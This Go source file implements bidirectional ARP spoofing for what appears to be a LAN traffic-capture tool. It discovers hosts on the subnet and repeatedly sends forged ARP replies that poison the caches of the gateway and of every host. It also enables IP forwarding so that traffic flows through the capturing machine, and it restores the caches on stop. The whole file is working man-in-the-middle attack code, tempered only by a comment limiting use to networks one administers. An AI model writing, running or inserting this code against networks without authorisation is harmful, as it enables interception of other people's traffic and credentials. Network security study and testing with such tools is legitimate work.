// Package spoof implements bidirectional ARP spoofing so that LAN traffic
// transits the capturing host. Use ONLY on networks you administer.
package spoof

import (
	"context"
	"fmt"
	"log/slog"
	"net"
	"os/exec"
	"sync"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"

	"wtfi3/internal/netinfo"
)

// Store is the subset of the aggregator the spoofer reports into.
type Store interface {
	SetARP(ip net.IP, mac net.HardwareAddr)
	LookupARP(ip net.IP) (net.HardwareAddr, bool)
	MarkSpoofed(ip net.IP)
}

// Spoofer poisons ARP caches between the gateway and every discovered host.
type Spoofer struct {
	self    *netinfo.Self
	handle  *pcap.Handle
	store   Store
	cancel  context.CancelFunc
	mu      sync.Mutex
	targets map[string]net.HardwareAddr
	wg      sync.WaitGroup
	stopOne sync.Once
}

// Start begins discovery and poisoning. Goroutines stop when ctx is canceled
// or Stop is called; Stop also restores the ARP caches.
func Start(ctx context.Context, self *netinfo.Self, scanCIDR string, store Store) (*Spoofer, error) {
	if self.Gateway == nil {
		return nil, fmt.Errorf("no default gateway found; cannot spoof")
	}
	// ARP is IPv4-only; an IPv6-only interface has no usable source address.
	if self.IP == nil || self.Mask == nil {
		return nil, fmt.Errorf("ARP spoofing requires an IPv4 address on %s", self.Name)
	}
	h, err := pcap.OpenLive(self.Name, 1600, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	if err := h.SetBPFFilter("arp"); err != nil {
		h.Close()
		return nil, fmt.Errorf("set bpf: %w", err)
	}

	cctx, cancel := context.WithCancel(ctx)
	sp := &Spoofer{self: self, handle: h, store: store, cancel: cancel, targets: map[string]net.HardwareAddr{}}

	sp.wg.Add(1)
	go sp.listenReplies(cctx)

	gwMAC, err := sp.resolve(cctx, self.Gateway)
	if err != nil {
		sp.Stop()
		return nil, fmt.Errorf("resolve gateway %s: %w", self.Gateway, err)
	}
	self.GwMAC = gwMAC
	slog.Info("gateway resolved", "ip", self.Gateway.String(), "mac", gwMAC.String())

	setForwarding(true)

	network := scanCIDR
	if network == "" {
		network = deriveCIDR(self.IP, self.Mask)
	}
	sp.wg.Add(2)
	go sp.discoverLoop(cctx, network)
	go sp.poisonLoop(cctx)
	return sp, nil
}

// Stop cancels all goroutines, restores ARP caches, and disables forwarding.
func (sp *Spoofer) Stop() {
	sp.stopOne.Do(func() {
		sp.cancel()
		sp.wg.Wait()
		sp.restore()
		setForwarding(false)
		sp.handle.Close()
		slog.Info("spoof stopped, ARP caches restored")
	})
}

func (sp *Spoofer) listenReplies(ctx context.Context) {
	defer sp.wg.Done()
	src := gopacket.NewPacketSource(sp.handle, sp.handle.LinkType())
	pkts := src.Packets()
	for {
		select {
		case <-ctx.Done():
			return
		case p, ok := <-pkts:
			if !ok {
				return
			}
			arp, ok := p.Layer(layers.LayerTypeARP).(*layers.ARP)
			if !ok || arp.Operation != layers.ARPReply {
				continue
			}
			ip := net.IP(arp.SourceProtAddress).To4()
			mac := net.HardwareAddr(arp.SourceHwAddress)
			if ip == nil || ip.Equal(sp.self.IP) {
				continue
			}
			sp.store.SetARP(ip, mac)
			if ip.Equal(sp.self.Gateway) {
				continue
			}
			sp.mu.Lock()
			if _, seen := sp.targets[ip.String()]; !seen {
				sp.targets[ip.String()] = append(net.HardwareAddr(nil), mac...)
				sp.store.MarkSpoofed(ip)
				slog.Info("spoof target", "ip", ip.String(), "mac", mac.String())
			}
			sp.mu.Unlock()
		}
	}
}

func (sp *Spoofer) resolve(ctx context.Context, ip net.IP) (net.HardwareAddr, error) {
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		sp.sendARP(layers.ARPRequest, sp.self.MAC, sp.self.IP, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ip)
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-time.After(250 * time.Millisecond):
		}
		if mac, ok := sp.store.LookupARP(ip); ok && len(mac) == 6 {
			return mac, nil
		}
	}
	return nil, fmt.Errorf("no reply")
}

func (sp *Spoofer) discoverLoop(ctx context.Context, cidr string) {
	defer sp.wg.Done()
	scan := func() {
		ips, err := hostsOf(cidr)
		if err != nil {
			return
		}
		for _, ip := range ips {
			if ip.Equal(sp.self.IP) || ip.Equal(sp.self.Gateway) {
				continue
			}
			sp.sendARP(layers.ARPRequest, sp.self.MAC, sp.self.IP, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ip)
		}
	}
	scan()
	t := time.NewTicker(30 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			scan()
		}
	}
}

func (sp *Spoofer) poisonLoop(ctx context.Context) {
	defer sp.wg.Done()
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			sp.mu.Lock()
			for ipStr, mac := range sp.targets {
				ip := net.ParseIP(ipStr).To4()
				sp.sendARP(layers.ARPReply, sp.self.MAC, sp.self.Gateway, mac, ip)
				sp.sendARP(layers.ARPReply, sp.self.MAC, ip, sp.self.GwMAC, sp.self.Gateway)
			}
			sp.mu.Unlock()
		}
	}
}

func (sp *Spoofer) restore() {
	sp.mu.Lock()
	defer sp.mu.Unlock()
	if sp.self.GwMAC == nil {
		return
	}
	for ipStr, mac := range sp.targets {
		ip := net.ParseIP(ipStr).To4()
		for i := 0; i < 3; i++ {
			sp.sendARP(layers.ARPReply, sp.self.GwMAC, sp.self.Gateway, mac, ip)
			sp.sendARP(layers.ARPReply, mac, ip, sp.self.GwMAC, sp.self.Gateway)
			time.Sleep(100 * time.Millisecond)
		}
	}
}

func (sp *Spoofer) sendARP(op uint16, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) {
	eth := layers.Ethernet{SrcMAC: srcMAC, DstMAC: dstMAC, EthernetType: layers.EthernetTypeARP}
	if op == layers.ARPRequest {
		eth.DstMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, &eth, &arp); err != nil {
		return
	}
	_ = sp.handle.WritePacketData(buf.Bytes())
}

func setForwarding(on bool) {
	v := "0"
	if on {
		v = "1"
	}
	if err := exec.Command("sysctl", "-w", "net.inet.ip.forwarding="+v).Run(); err != nil {
		slog.Warn("could not set ip.forwarding", "value", v, "err", err)
	}
}

func deriveCIDR(ip net.IP, mask net.IPMask) string {
	ones, _ := mask.Size()
	return fmt.Sprintf("%s/%d", ip.Mask(mask).String(), ones)
}

func hostsOf(cidr string) ([]net.IP, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	var ips []net.IP
	for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); ip = nextIP(ip) {
		ips = append(ips, dup(ip))
		if len(ips) > 4096 {
			break
		}
	}
	if len(ips) > 2 {
		ips = ips[1 : len(ips)-1] // drop network + broadcast
	}
	return ips, nil
}

func nextIP(ip net.IP) net.IP {
	out := dup(ip)
	for i := len(out) - 1; i >= 0; i-- {
		out[i]++
		if out[i] != 0 {
			break
		}
	}
	return out
}

func dup(ip net.IP) net.IP {
	c := make(net.IP, len(ip))
	copy(c, ip)
	return c
}
